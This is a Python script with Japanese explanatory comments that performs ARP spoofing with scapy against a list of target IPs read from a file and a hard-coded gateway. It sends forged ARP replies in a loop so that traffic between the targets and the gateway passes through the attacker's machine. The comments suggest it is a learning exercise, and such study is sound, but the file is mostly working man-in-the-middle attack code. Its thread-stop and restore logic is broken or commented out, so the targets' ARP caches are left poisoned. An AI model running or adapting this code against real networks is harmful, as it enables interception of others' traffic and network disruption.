import sys
import threading
import time
from pprint import pprint

import scapy.all
from scapy.layers.l2 import Ether, ARP

def get_mac(ip_address: str):
    """
    引数で指定された IP アドレスからデータリンク層のMACアドレスを返却します。
    見つからない場合はNoneを返却します。
    :param ip_address: MACアドレスを取得したいホストのIPアドレス
    :return: str | None
    """
    responses, unanswered = scapy.all.srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
                                          timeout=2,
                                          retry=10)
    # レスポンス内のMACアドレスを返却
    for s, r in responses:
        return r[Ether].src
    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, stop_event):
    poison_target = ARP(
        # オペレーションコード(リクエストは1、リプライは2)
        # オペレーションコードに2を指定して、(要求されてもない)嘘情報のリプライを送りつけている
        op=2,
        # プロトコル・ソースアドレス(IPアドレス)
        # gateway_ip から来たものとして詐称している
        psrc=gateway_ip,
        # プロトコル・ディスティネーションアドレス(IPアドレス)
        # target_ip に送りつける
        pdst=target_ip,
        # ハードウェア・ディスティネーションアドレス(MACアドレス)
        hwdst=target_mac,
    )
    poison_gateway = ARP(
        op=2,
        # 攻撃対象から来たARPリプライだと詐称して、攻撃マシンのMACアドレスと攻撃対象マシンのIPアドレスを紐づけさせる
        psrc=target_ip,
        pdst=gateway_ip,
        hwdst=gateway_mac,
    )

    print(f'[*] Beginning the ARP poison. [CTRL-C to stop]\n')

    while True:
        try:
            # 攻撃対象マシンにパケット送出
            scapy.all.send(poison_target)
            # ゲートウェイにパケット送出
            scapy.all.send(poison_gateway)
            time.sleep(5)
        except KeyboardInterrupt:
            break

    print(f'[*] ARP poison attack finished.')


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # sendメソッドによる復元
    print(f'[*] Restoring target...')
    scapy.all.srp(
        ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac,
            pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff',)
    )
    scapy.all.srp(
        ARP(op=2, psrc=target_ip, hwsrc=target_mac,
            pdst=gateway_ip, hwdst='ff:ff:ff:ff:ff:ff',)
    )

interface = 'Wi-Fi'
# target_ip = "192.168.10.103"
gateway_ip = "192.168.10.1"
# インターフェースの設定
scapy.all.conf.iface = interface
# 出力の停止
scapy.all.conf.verb = 0

if __name__ == '__main__':
    # インターフェースの出力
    print(f'[*] Setting up {interface}')

    # ターゲットの羅列
    target_mac_addresses = {}
    with open('target_ips.txt', 'r', encoding='utf-8') as f:
        lines = f.readlines()
        for line in lines:
            ip_addr = line.strip()
            mac_addr = get_mac(ip_addr)
            if mac_addr is None:
                print(f'[!!!] Failed to get {ip_addr}\'s MAC.')
                continue
            target_mac_addresses[ip_addr] = mac_addr
        pprint(target_mac_addresses)

    gateway_mac = get_mac(gateway_ip)
    if gateway_mac:
        print(f'[*] Gateway {gateway_ip} is at {gateway_mac}')
    else:
        print(f'[!!!] Failed to get Gateway {gateway_ip}\'s MAC. Exiting.')
        sys.exit(0)

    # それぞれのターゲットに対してスレッドを起動
    for target_ip, target_mac in target_mac_addresses.items():
        print(f'[*] Target {target_ip} is at {target_mac}')
        # 汚染用スレッドの起動
        stop_event = threading.Event()
        poison_thread = threading.Thread(target=poison_target,
                                         args=(gateway_ip, gateway_mac, target_ip, target_mac, stop_event))
        poison_thread.start()
        # 汚染用スレッドの停止
        stop_event.set()
        poison_thread.join()
        # ネットワークの復元
        # restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
